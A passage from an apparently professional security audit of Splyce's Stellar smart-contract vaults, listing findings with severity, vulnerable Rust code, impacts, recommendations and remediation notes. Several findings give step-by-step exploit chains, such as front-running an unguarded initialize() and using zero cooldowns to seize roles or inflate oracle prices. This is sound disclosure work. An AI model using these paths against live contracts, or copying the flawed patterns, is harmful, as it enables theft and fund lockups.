2. User calls `swap_tokens(A → B, 500 shares)`. At line 2302, `Base::update` burns 500 A shares. At line 2306, `allowlist_mint` mints 500 B shares to the user.
3. `allowlist_mint` calls only `Base::mint`: a share-token balance operation with no USDC movement and no `write_total_idle` call. Vault B's `total_idle` remains 1,000 USDC while its share supply grows to 1,500. Vault A's `total_idle` also remains unchanged despite having 500 fewer share obligations.
4. After the swap: vault A holds excess `total_idle` (1,000 USDC for 500 remaining shares) with no on-chain signal to release it; vault B is short 500 USDC of `total_idle` relative to its new share count (1,500 shares, 1,000 USDC). The total underlying across both vaults is preserved; the skew is in distribution, not in value.
5. The design relies on the shared off-chain asset manager to rebalance, but no on-chain ledger records the debt owed to vault B, making the imbalance invisible to vault accounting.

#### Code Location

`SToken.swap_tokens()`**:** burn source shares then mint destination shares; no underlying transfer between vaults

```rust
// contracts/stoken/src/stoken.rs
// Burn source tokens (use update to avoid "frame is already authorized" error)
Base::update(&env, Some(&caller), None, source_amount as i128);   // line 2302
emit_burn(&env, &caller, source_amount as i128);                   // line 2303

// Mint destination tokens
desitnation_vault_client.allowlist_mint(                           // line 2306
    &source_vault,
    &caller,
    &destination_amount_to_mint,
);
// No token_client.transfer between vaults; destination total_idle is never incremented
```

`SToken.allowlist_mint()`**:** mints shares without receiving underlying or updating total_idle

```rust
// contracts/stoken/src/stoken.rs
Base::mint(&env, &to, amount as i128);   // line 453
// write_total_idle not called; no underlying token received
```

**Impact.**

After a swap, vault B's `total_idle` understates the underlying it is owed while vault A's `total_idle` is overstated by the same amount. No underlying value is destroyed: the USDC backing the burned A shares remains at vault A or the shared asset manager, but the on-chain accounting provides no mechanism to track or enforce the rebalancing obligation. Vault B withdrawers may face delays or shortfalls if the off-chain asset manager does not promptly credit vault B via `return_funds`. Existing vault B depositors bear the liquidity risk for the duration of any rebalancing delay.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Transfer the equivalent underlying value from the source vault to the destination vault atomically within the swap transaction, and update both vaults' idle balances accordingly, eliminating the dependency on off-chain rebalancing. Note that this approach requires the source vault to hold sufficient idle liquidity at swap time; if most of its underlying is deployed to the asset manager, a prior liquidity return must occur before the swap can proceed.
- Alternatively, record the underlying obligation owed to the destination vault on-chain at the time of the swap, and use that recorded amount to reserve a portion of the destination vault's idle balance from being deployed or used to fulfill withdrawals until the asset manager explicitly settles the debt through a dedicated settlement path, distinct from general liquidity returns.

**Remediation notes.**

**RISK ACCEPTED**: The **Splyce team** made a business decision to accept the risk of this finding and not alter the contracts, stating that:

> Shares-only swap is intentional (shared trusted
>
> ```solidity
> asset_manager
> ```
>
> reconciles backing off-chain). Interim on-chain underlying transfer was reverted because it gated swaps on source idle and broke normal deployed-funds operation. 690eb9c2a054154bece53d1ce173a8b9f8f258ab, dde17775916fef663ff0adcc8d4d8be999ac952a

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-021] Unstructured panic!() Obscures Runtime Errors In Core Token Functions

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 3.13 (AO:A/AC:L/AX:L/R:N/S:U/C:N/A:L/I:L/D:N/Y:N) (source: HAL-21) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | operational |
| **Location** | `contracts/stoken/src/stoken.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/91911fba3dc12fa4d49b3a89cbc220db3db79e57 |
| **Redacted** | false |

**Description.**

`SToken.burn()`, `SToken.burn_from()`, `FungibleVault::deposit()`, and `FungibleVault::redeem()` propagate internal errors by calling `panic!()` or `unwrap_or_else(|_| panic!(...))` instead of returning structured Soroban contract error codes. In Soroban, a bare `panic!()` produces an opaque host trap that is indistinguishable to callers from network errors, resource exhaustion, or any other non-contract failure; structured errors emitted by `panic_with_error!` or `return Err(...)` carry a typed contract error code that clients and tooling can match programmatically.

**Operational failure path (**`burn` **/** `burn_from`**):** These functions are the primary SEP-41 exit points for integrators. When `redeem_core` returns any error, `VaultPaused`, `InsufficientShares`, `MinimumSharesNotMet`, etc., the `unwrap_or_else(|err| panic!("SToken: burn failed: {:?}", err))` branch fires, producing an opaque trap. The SEP-41 trait mandates `fn burn(...) -> ()` (no Result), so `return Err(...)` is not conformant; the correct path is `panic_with_error!(e, <structured_error>)`, which emits a typed contract error code while satisfying the trait signature.

**Re-initialization path (**`initialize`**):** Although `initialize` is protected by factory deployment patterns in practice, a front-running deployer who calls it first causes all subsequent calls to panic with an untyped trap rather than returning a recognisable `AlreadyInitialized` error code, defeating any programmatic detection by deployment scripts.

`FungibleVault::deposit` and `FungibleVault::redeem` follow the same pattern and are arguably more user-facing than `burn`.

#### Code Location

`SToken.burn()`: opaque panic on every internal error

```rust
// contracts/stoken/src/stoken.rs
fn burn(e: &Env, from: Address, amount: i128) {
    from.require_auth();
    if amount <= 0 {
        panic!("SToken: burn amount must be positive"); // line 3142: unstructured
    }
    let shares = u64::try_from(amount)
        .unwrap_or_else(|_| panic!("SToken: burn amount too large")); // line 3144
    Self::redeem_core(e, &from, &from, &from, shares, 0)
        .unwrap_or_else(|err| panic!("SToken: burn failed: {:?}", err)); // line 3146
    emit_burn(e, &from, amount);
}
```

`SToken.burn_from()`: same anti-pattern

```rust
// contracts/stoken/src/stoken.rs
fn burn_from(e: &Env, spender: Address, from: Address, amount: i128) {
    spender.require_auth();
    if amount <= 0 {
        panic!("SToken: burn_from amount must be positive"); // line 3153
    }
    let shares = u64::try_from(amount)
        .unwrap_or_else(|_| panic!("SToken: burn_from amount too large")); // line 3155
    Base::spend_allowance(e, &from, &spender, amount);
    Self::redeem_core(e, &from, &from, &spender, shares, 0)
        .unwrap_or_else(|err| panic!("SToken: burn_from failed: {:?}", err)); // line 3158
```

**Impact.**

- Any integrator calling `burn` or `burn_from` on a paused vault, with insufficient shares, or when the minimum-shares-to-mint constraint is not met receives an opaque host trap with no programmatically distinguishable error code, forcing error detection to rely on string parsing or heuristics.
- Wallets, bridges, and DeFi aggregators that consume the SEP-41 `burn` interface cannot implement structured retry/fallback logic for specific failure conditions (e.g., retry after unpause vs. hard-fail on bad amount).
- A double-initialization attempt panics with an opaque trap rather than a typed `AlreadyInitialized` error, which breaks deployment scripts that check the return value to detect replay.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- For `burn` and `burn_from`, use `panic_with_error!(e, <STokenCoreError variant>)` instead of bare `panic!()`. This is the only conformant path because the SEP-41 trait signature is `fn burn(...) -> ()` and cannot be changed to return a `Result`.
- For `initialize`, add an `AlreadyInitialized` variant to the core error enum and use `return Err(STokenCoreError::AlreadyInitialized)` instead of `panic!()`.
- For `FungibleVault::deposit` and `FungibleVault::redeem`, which return `i128` rather than `()`, the `panic_with_error!` macro is not required: their trait signatures are non-`()` and can be changed to return a `Result` or use a structured error type directly. Replace the bare `panic!` / `unwrap_or_else panic` calls with `return Err(...)` propagation using the appropriate error variant.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by replacing every bare `panic!`/`unwrap_or_else(panic!)` in `burn`, `burn_from`, `initialize`, `deposit`, `redeem`, and `mint` with `panic_with_error!` (typed `STokenCoreError` codes) or direct `Err(...)` propagation, reusing `InitializationFailed` for double-init in place of a new `AlreadyInitialized` variant due to the enum's 50-variant XDR cap.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-022] Emergency Withdraw Skips total_idle Decrement, Breaking Vault Accounting

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 3.09 (AO:A/AC:L/AX:H/R:N/S:U/C:N/A:H/I:H/D:N/Y:N) (source: HAL-22) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | accounting-arithmetic |
| **Location** | `contracts/stoken/src/stoken.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/932059dc442e27497a253addab7300559eeca5e2 |
| **Redacted** | false |

**Description.**

`SToken.emergency_withdraw()` transfers the underlying asset out of the vault on the second call but never decrements `total_idle`, leaving the vault's liquidity counter overstated by the withdrawn amount. Every other fund-outflow path (`process_deposits`, `fulfill_withdrawal`) decrements `total_idle` after transfer; `emergency_withdraw` does not. After execution, `total_idle > vault_balance`, violating the core accounting invariant.

#### Code Location

`SToken.emergency_withdraw()`: token transfer with no `total_idle` update

```rust
// contracts/stoken/src/stoken.rs
let token = Client::new(&env, &token_mint); // line 1884
let vault_balance = token.balance(&vault_address) as u64;
token.transfer(&vault_address, &caller, &(amount as i128)); // line 1893 total_idle not decremented
write_emergency_withdraw_token_mint(&env, None);
write_emergency_withdrawal_amount(&env, &0);
write_emergency_withdraw_timelock_end(&env, &0);
```

`SToken.process_deposits()`: correct decrement pattern for comparison

```rust
// contracts/stoken/src/stoken.rs
write_total_idle(&env, &total_idle.checked_sub(amount)?); // decremented on every outgoing transfer
```

**Impact.**

When the vault is unpaused after an emergency withdrawal: `process_deposits` believes more liquidity is available than exists, causing SAC transfer reverts instead of a clear vault-level accounting error; `fulfill_withdrawal` attempts payouts against the inflated `total_idle`, blocking withdrawal processing for users with pending requests; off-chain monitors relying on `total_idle` as a liquidity signal will overstate available capital. The gap persists until manually reconciled.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Decrement `total_idle` inside `emergency_withdraw` when the withdrawn token is the vault's underlying asset, consistent with all other outflow paths. Use `saturating_sub` to handle any pre-existing accounting drift without panicking.
- As defense in depth, clamp `total_idle` to the actual on-chain vault balance during `unpause_vault`, so any overstatement caused by a prior emergency withdrawal is corrected before normal operations resume.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-023] Zero Cooldown Bypasses Two-Step Governance in Three Contracts

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.81 (AO:S/AC:L/AX:L/R:N/S:C/C:N/A:N/I:H/D:H/Y:H) (source: HAL-23) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | governance-centralization |
| **Location** | `contracts/fixed_yield_oracle/src/fixed_yield_oracle.rs`, `contracts/nav_oracle/src/nav_oracle.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/08ea9e9bd6ecb239c7a70f452ed08da1a0756bc8 |
| **Redacted** | false |

**Description.**

`FixedYieldOracle.propose_cooldown()`, `NavOracle.propose_cooldown()`, and `Accountant.propose_cooldown()` accept `new_cooldown_secs: u64` with no lower-bound validation. `accept_cooldown` in all three contracts also writes `pending.new_cooldown_secs` to live storage without a minimum check, leaving both entry points in the governance chain unguarded. A compromised manager sets the cooldown to zero and accepts it; after that single wait, every subsequent governance change in that contract can be proposed and accepted in one transaction.

The `accept_cooldown` guard reads the *current* (pre-change) cooldown, not the proposed one:

```rust
if timestamp < pending.timestamp + current_cooldown { return Err(...); }
```

When `current_cooldown` is already 0 (from a prior zero-cooldown acceptance), the check becomes `timestamp < pending.timestamp`, which is permanently false because Stellar ledger timestamps are monotonically non-decreasing. From this point, every subsequent `accept_*` call in the same contract succeeds immediately.

Note: accepting the zero cooldown itself still requires waiting the *original* non-zero cooldown, so one barrier remains before the bypass is active. After that single wait, all subsequent governance changes are instant.

**FixedYieldOracle exploit chain (compromised** `manager` **key):**

1. Manager calls `propose_cooldown(0, manager)` → writes `PendingCooldown { new_cooldown_secs: 0, timestamp: T }`.
2. Wait the existing cooldown period.
3. Manager calls `accept_cooldown(manager)` → `write_cooldown_secs(&env, 0)` succeeds.
4. In a single Stellar multi-operation transaction: manager calls `propose_yield_parameters(10000, manager)` then `accept_yield_parameters(manager)`, both succeed because cooldown is 0.
5. Oracle now reports 100% APY; next call to `update_vault_price_from_yield` applies the inflated rate to `stoken::update_price`.

**Accountant exploit chain (compromised** `manager` **key):**

1. Same steps 1–3 as above against the Accountant.
2. Manager calls `propose_manager(attacker_addr, manager)` then `accept_manager(manager)` in one transaction.
3. Attacker holds the Accountant's manager role with no cooldown barrier remaining.

#### Code Location

`FixedYieldOracle.propose_cooldown()`: no lower-bound check

```rust
// contracts/fixed_yield_oracle/src/fixed_yield_oracle.rs (line 263)
#[only_role(caller, "manager")]
pub fn propose_cooldown(
    env: Env,
    new_cooldown_secs: u64,   // no minimum validation
    caller: Address,
) -> Result<(), FixedYieldOracleError> {
    // ...
    write_pending_cooldown(
        &env,
        Some(PendingCooldown { new_cooldown_secs, timestamp }),
    );
    // ...
}
```

`FixedYieldOracle.accept_cooldown()`: guard uses old cooldown, not proposed one

```rust
// contracts/fixed_yield_oracle/src/fixed_yield_oracle.rs (lines 302-303)
let current_cooldown = read_cooldown_secs(&env); // reads OLD value
if timestamp < pending.timestamp + current_cooldown { // always false when current == 0
    return Err(FixedYieldOracleError::CooldownChangeCooldownNotExpired);
}
```

`NavOracle.propose_cooldown` (lines 336–365) and `Accountant.propose_cooldown` (lines 433–462) follow the identical pattern.

`NavOracle.accept_cooldown()`: writes pending value with no minimum check (same in FixedYieldOracle and Accountant)

```rust
// contracts/nav_oracle/src/nav_oracle.rs (lines 379-385)
    let current_cooldown = read_cooldown_secs(&env);
    if timestamp < pending.timestamp + current_cooldown { ... } // always false when current == 0
    write_cooldown_secs(&env, &pending.new_cooldown_secs); // no minimum check before commit
```

**Impact.**

- In `FixedYieldOracle`: a compromised `manager` can set yield rate to 100% APY with zero delay, causing `update_vault_price_from_yield` to report an inflated price that enables over-valued share redemptions and vault insolvency.
- In `Accountant`: a compromised `manager` can instantly transfer the manager role to an attacker address, redirecting all accumulated fee-share distributions to the attacker's recipients.
- Both chains require a single initial cooldown wait to establish zero cooldown; all subsequent changes are permanently instant with no on-chain correction path.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Add a minimum cooldown constant and enforce it in both `propose_cooldown` and `accept_cooldown` across all three contracts.
- Apply identically in `fixed_yield_oracle.rs`, `nav_oracle.rs`, and `accountant.rs`.
- Optionally enforce a maximum upper bound (e.g., 30 days) to prevent inadvertent governance lockout.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-024] Unilateral Role Transfers Allow Assignment Without Incoming Holder Consent

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.66 (AO:S/AC:L/AX:L/R:N/S:C/C:N/A:H/I:H/D:M/Y:N) (source: HAL-24) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | state-archival-ttl |
| **Location** | `contracts/stoken/src/stoken.rs`, `contracts/proxy_asset_manager/src/proxy_asset_manager.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/3b58a390697ccff1a68ca69c680409d6e8c857c4 |
| **Redacted** | false |

**Description.**

In `SToken::accept_roles`, `ProxyAssetManager::accept_manager`, and `Accountant::accept_manager`, the accept step is executed exclusively by the CURRENT role holder; the incoming new role holder never calls `require_auth()` to authenticate the transfer. This one-sided design exposes two distinct failure modes:

**Sub-finding A: Accidental lockout via address typo:** If a manager calls `propose_manager(new_manager=WRONG_ADDRESS)` and then `accept_manager`, the current manager role is irrevocably revoked and assigned to an uncontrolled address. Since `SToken::grant_role`, `revoke_role`, and `renounce_role` are all unconditional panics (stoken.rs lines 3502-3510), there is no on-chain recovery path for SToken.

**Sub-finding B: Forced oracle/processor/asset_manager assignment:** The current SToken manager can call `propose_roles(new_oracle=ATTACKER_CONTRACT)` and after `role_change_cooldown_secs`, call `accept_roles` to grant the oracle role to an attacker-controlled contract without that contract ever signing anything. The attacker contract then calls `update_price` with a manipulated price.

`ProxyAssetManager::cancel_manager` is callable by the current manager before `accept_manager` and can abort a pending proposal, so ProxyAssetManager retains an abort path; SToken has no equivalent cancel for pending roles.

#### Code Location

`ProxyAssetManager.accept_manager()`**:** new holder never authenticates

```rust
// contracts/proxy_asset_manager/src/proxy_asset_manager.rs: lines 479-481
access_control::grant_role_no_auth(&env, &caller, &pending.new_manager, &manager_role);
access_control::revoke_role_no_auth(&env, &caller, &caller, &manager_role);
// pending.new_manager.require_auth() absent
```

`SToken.accept_roles()`**:** same pattern for all operational roles

```rust
// contracts/stoken/src/stoken.rs: lines 617-620
access_control::grant_role_no_auth(&env, &caller, &oracle, &oracle_role);
if oracle != old_oracle {
    access_control::revoke_role_no_auth(&env, &caller, &old_oracle, &oracle_role);
}
// new oracle never calls require_auth()
```

`SToken.grant_role()`**:** unconditional panic blocks emergency recovery

```rust
// contracts/stoken/src/stoken.rs: lines 3502-3510
fn grant_role(_e: &Env, _caller: Address, _account: Address, _role: Symbol) {
    panic!("Use propose_roles/accept_roles instead");
}
fn revoke_role(_e: &Env, _caller: Address, _account: Address, _role: Symbol) {
    panic!("Use propose_roles/accept_roles instead");
}
```

**Impact.**

For Sub-finding A: a single character typo in the proposed new address permanently removes the manager role from the only address that holds it, leaving the vault in an unrecoverable state where no on-chain actor can perform any manager-gated action. For Sub-finding B: a malicious SToken manager can assign the oracle role to an attacker-controlled contract after waiting the governance cooldown, enabling arbitrary price manipulation, minting excessive shares on deposit or triggering under-payment on withdrawal.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Change `ProxyAssetManager::accept_manager` and `Accountant::accept_manager` to be callable only by `pending.new_manager`, requiring `caller.require_auth()` where `caller == pending.new_manager`. This mirrors the `stellar_access::AccessControl` two-step admin transfer pattern, which already enforces this correctly.
- For `SToken::accept_roles`, implement a separate per-role accept function (e.g., `accept_role_assignment(role: Symbol)`) callable only by the proposed new holder for that role, requiring `require_auth()` from the incoming address before the grant executes.
- Add a `cancel_pending_roles` function to SToken (analogous to `cancel_manager` in ProxyAssetManager) so the current manager can abort a mistaken role proposal before it is accepted.

**Remediation notes.**

**SOLVED**: The Splyce team solved this finding across commits [914cd58](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/914cd58349ef4f5e50fb0bfb24c416c3451c4118), [1bb0502](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/1bb0502acdb1910a5d054caedf6a1e9d417fb1b1), [b93ed00](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/b93ed00c5a2a50fb497ab1eb3ace3ec8eb3a9901), and [3b58a39](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/3b58a390697ccff1a68ca69c680409d6e8c857c4). Commit [914cd58](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/914cd58349ef4f5e50fb0bfb24c416c3451c4118) required `require_auth()` from the incoming holder for the `manager` role (across the affected contracts) and the `guardian` role (SToken), closing Sub-finding A, while Sub-finding B remained open after the operational-role consent added in [e413f0f](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/e413f0fe473fa7751eb7810c4a1edbcf21cb5ad6) was reverted in [4507153](https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/4507153d506ee128007d50d590a0d970ce98be57). The three later commits close the remaining gap by requiring incoming consent on `NavOracle::accept_nav_provider` and related manager transfers, adding `cancel_pending_roles`/`get_pending_roles`, and replacing the manager-driven batch `accept_roles` path with a per-role `accept_role_assignment` handshake that requires incoming-holder `require_auth()` (and satellite `accept_vault_role` for contract-held roles).

Halborn remediation date: 2026-07-30.

---

### [SPLYCE-HAL-025] NavOracle Price Omits Decimals Offset Scaling

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.66 (AO:S/AC:L/AX:L/R:N/S:C/C:N/A:H/I:H/D:M/Y:N) (source: HAL-25) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | accounting-arithmetic |
| **Location** | `contracts/nav_oracle/src/nav_oracle.rs:L172-L178`, `contracts/stoken/src/stoken.rs:L192-L199`, `contracts/nav_oracle/src/nav_oracle.rs:L268-L276` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/4d92c953660757cfcfcd523c4b3df589ff86d564 |
| **Redacted** | false |

**Description.**

`NavOracle.update_vault_price_from_nav()` computes the vault price as `total_nav * PRICE_PRECISION / total_shares` without applying the `10^(share_decimals - underlying_decimals)` scaling factor that `SToken`'s share-price math requires whenever a vault is configured with a non-zero decimals offset.

**Exploit path:**

1. `SToken::initialize` accepts a `share_decimals` value distinct from the underlying token's decimals and derives `offset = share_decimals - underlying_decimals` (bounded by `MAX_DECIMALS_OFFSET`), which `amount_to_shares_core` folds into `shares_raw = amount_underlying_raw * 10^offset * PRICE_PRECISION / price`.
2. `NavOracle.update_vault_price_from_nav()` reads `total_nav` (off-chain NAV value plus the vault's raw on-chain underlying balance) and `total_shares` (raw share supply) and computes `calculated_price = total_nav * PRICE_PRECISION / total_shares`, with no `10^offset` term applied to either operand.
3. For a vault configured with `underlying_decimals = 6`, `share_decimals = 9` (`offset = 3`): after a 1,000 USDC deposit (`1_000_000_000` raw) at `initial_price = 1_000_000`, `total_shares = 1_000_000_000_000` raw and `vault_underlying_balance = 1_000_000_000` raw. A provider push with `total_nav ≈ 1_000_000_000` (NAV unchanged) computes `calculated_price = 1_000_000_000 * 1_000_000 / 1_000_000_000_000 = 1_000`, three orders of magnitude below the correct `1_000_000`.
4. For `offset ≥ 6`, the same division truncates to `0` before `stoken.update_price` is invoked.

#### Code Location

`NavOracle.update_vault_price_from_nav()`**:** price formula omits the decimals-offset factor

```rust
let nav_with_precision = (total_nav as u128)
    .checked_mul(PRICE_PRECISION as u128)
    .ok_or(NavOracleError::PriceCalculationOverflow)?;

let calculated_price = nav_with_precision
    .checked_div(total_shares as u128)
    .ok_or(NavOracleError::PriceCalculationOverflow)?;
```

`SToken::initialize()`**:** decimals offset derived and stored per vault configuration

```rust
let offset = config
    .share_decimals
    .checked_sub(u_dec)
    .ok_or(STokenCoreError::MathOverflow)?;
if offset > MAX_DECIMALS_OFFSET {
    return Err(STokenCoreError::InitializationFailed);
}
Vault::set_decimals_offset(&env, offset);
```

`amount_to_shares_core()`**:** the offset factor NavOracle's formula omits

```rust
let shares = if shares_decimals >= underlying_decimals {
    let decimal_diff = shares_decimals - underlying_decimals;
    (amount_underlying as u128)
        .checked_mul(10_u128.pow(decimal_diff as u32))
        .ok_or(STokenCoreError::MathOverflow)?
        .checked_mul(PRICE_PRECISION as u128)
        .ok_or(STokenCoreError::MathOverflow)?
        .checked_div(price as u128)
        .ok_or(STokenCoreError::MathOverflow)?
```

**Impact.**

- For any vault deployed with a non-zero decimals offset between the share token and the underlying asset, `NavOracle` produces a price that is off by a factor of `10^offset` from the value `SToken`'s own share-accounting math expects.
- For `offset ≥ 6`, `calculated_price` truncates to `0` on every call, `SToken::update_price` rejects `new_price == 0`, so the oracle can never successfully push a price for that vault.
- For smaller offsets, the price lands far outside `max_deviation_bps` and is queued as `PendingPrice`; if a manager accepts it (or the vault runs a permissive deviation band), subsequent deposits mint shares at a price that is off by orders of magnitude, diluting or draining existing holders depending on the direction of the error.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend normalizing `total_nav` and `total_shares` to a common decimal scale before dividing, mirroring `amount_to_shares_core` exactly: read `underlying_decimals` and `share_decimals` from the vault (already reachable via `query_asset` and the fungible-vault client), compute `price = total_nav * 10^(share_decimals - underlying_decimals) * PRICE_PRECISION / total_shares`, and reject a resulting `price == 0` with a dedicated error rather than letting the downstream `update_price` call fail silently on the generic zero-price check.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-026] Unguarded initialize() Enables Front-Running in Four Contracts

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.63 (AO:A/AC:M/AX:M/R:P/S:C/C:N/A:N/I:H/D:N/Y:H) (source: HAL-26) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | operational |
| **Location** | `contracts/accountant/src/accountant.rs`, `contracts/asset/src/asset.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/1d3393f9292d2af39c99b44bc99782c2eb9ebc0d |
| **Redacted** | false |

**Description.**

`Accountant.initialize()`, `NavOracle.initialize()`, `FixedYieldOracle.initialize()`, and `Asset.initialize()` impose no caller authorization requirement: any address can call these functions between contract deployment and the operator's intended initialization transaction.

The deployment script (`scripts/deploy_all.js`) splits deployment into separate transactions, `deployContract(wasmHash)` followed by a distinct `initialize()` call. On Stellar, transactions land in ledger closes ~5 seconds apart. Any on-chain observer who monitors for the deployment transaction can submit their own `initialize()` call in the next ledger close before the operator's.

`The only guard present in each contract is a check for whether the admin is already set:

```rust
if has_authority.is_some() { panic!("Vault already initialized"); }
```

This check does not prevent a front-runner from initializing first with an attacker-controlled `authority` address.

Note: `SToken` vaults deployed via `Factory.deploy_vault()` are initialized atomically within the same transaction and are **not** affected by this vulnerability. Only the four standalone contracts listed above are vulnerable.

**Front-run attack (Accountant example):**

1. Operator uploads WASM and calls `deployContract(wasmHash)`; Accountant exists on-chain with no admin set.
2. Attacker observes the deployment transaction and extracts the new contract address.
3. Before the operator's `initialize_accountant.js` transaction lands, attacker submits: `accountant.initialize(attacker_addr, attacker_addr2, weight1, weight2, attacker_addr, attacker_addr, attacker_addr, xlm, token, cooldown)`
4. Attacker's call succeeds; `has_authority.is_some()` is `false`.
5. Operator's subsequent `initialize()` reverts with `"Vault already initialized"`; the attacker holds the admin role with no reinitialization path.

The same attack applies to NavOracle (attacker becomes the sole price update authority) and FixedYieldOracle (attacker controls yield rate and oracle update rights).

#### Code Location

`Accountant.initialize()`: no caller auth requirement

```rust
// contracts/accountant/src/accountant.rs (lines 40-54)
pub fn initialize(
    env: Env,
    recipient1: Address, recipient2: Address,
    weight1: u64, weight2: u64,
    authority: Address, manager: Address, processor: Address,
    xlm: Address, token: Address, cooldown_secs: u64,
) -> Result<(), AccountantError> {
    let has_authority = access_control::get_admin(&env);
    if has_authority.is_some() {
        panic!("Vault already initialized"); // only guard
    }
    access_control::set_admin(&env, &authority); // attacker sets themselves
    // ...
}
```

`NavOracle.initialize()`, `FixedYieldOracle.initialize()`, and `Asset.initialize()` follow the same pattern with no `authority.require_auth()` call.

`Asset.initialize()`: identical pattern confirmed

```rust
// contracts/asset/src/asset.rs (lines 15-20)
pub fn initialize(e: &Env, authority: Address) {
    let has_authority = access_control::get_admin(e);
    if has_authority.is_some() {
        panic!("Vault already initialized"); // only guard
    }
    access_control::set_admin(e, &authority); // no authority.require_auth()
    // ...
}
```

**Impact.**

- **Attacker-controlled Accountant:** all protocol fee shares (deposit, withdrawal, management, and swap fees) are permanently redirected to attacker-chosen recipients via `distribute_tokens`/`distribute_xlm`; admin role also grants upgrade key control. This is the primary financial consequence: complete and permanent capture of all future protocol earnings across every vault using that Accountant.
- **Attacker-controlled NavOracle or FixedYieldOracle:** attacker is the sole price update authority. Price pushes within `max_deviation_bps` (default 50 bps) auto-apply without manager involvement, giving the attacker a continuous bounded manipulation vector. Larger deviations are queued as `PendingPrice` and require manager acceptance, limiting but not eliminating the attack surface.
- **Attacker-controlled Asset:** attacker controls the testnet USDC mock and can grant themselves the `minter` role to mint arbitrary test tokens. In production deployments using the Stellar native USDC SAC, this sub-finding has no bearing on user principal.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend migrating `Accountant`, `NavOracle`, `FixedYieldOracle`, and `Asset` to Protocol 22+ constructor pattern so initialization is atomic with deployment (no separate transaction window). `Factory` and `Multisig` already use this pattern correctly.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-027] Process Deposits Deploys Funds Reserved for Pending Withdrawals

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.51 (AO:A/AC:L/AX:M/R:P/S:U/C:N/A:H/I:N/D:N/Y:N) (source: HAL-27) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | operational |
| **Location** | `contracts/stoken/src/stoken.rs:L1128-L1132`, `contracts/stoken/src/stoken.rs:L1283-L1285` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/9c6e495c1791d4759c20178aa98faeb3380d12eb |
| **Redacted** | false |

**Description.**

`SToken.process_deposits()` checks only `amount <= total_idle` before transferring underlying tokens to the asset manager, with no floor reserved for `total_withdrawals_pending`, allowing the processor to deploy all idle funds, including those conceptually owed to pending withdrawal requests, and block all withdrawal fulfillments until the asset manager manually returns liquidity.

The risk arises from an honest operational error by the processor bot (which calls both `process_deposits` and `fulfill_withdrawal`) or from a compromised processor. A rogue or misconfigured processor can trigger this state with the following steps:

1. Alice deposits 1,000 USDC. `total_idle = 1,000`.
2. Bob calls `withdraw_request(100 shares)`. `amount_due = 100 USDC`. Bob's shares move to vault custody. `total_withdrawals_pending = 100`. `total_idle` remains 1,000, the underlying backing stays in the vault but is not ring-fenced.
3. Processor calls `process_deposits(1,000)`. The only check at line 1130, `amount > total_idle`, passes because `1,000 <= 1,000`. All 1,000 USDC is transferred to the asset manager. `total_idle = 0`.
4. Processor calls `fulfill_withdrawal(bob, request_id)`. `amount_to_pay = 100 USDC`. The check `amount_to_pay > read_total_idle(&env)`, `100 > 0`, reverts with `InsufficientBalance`. Bob's withdrawal is blocked.
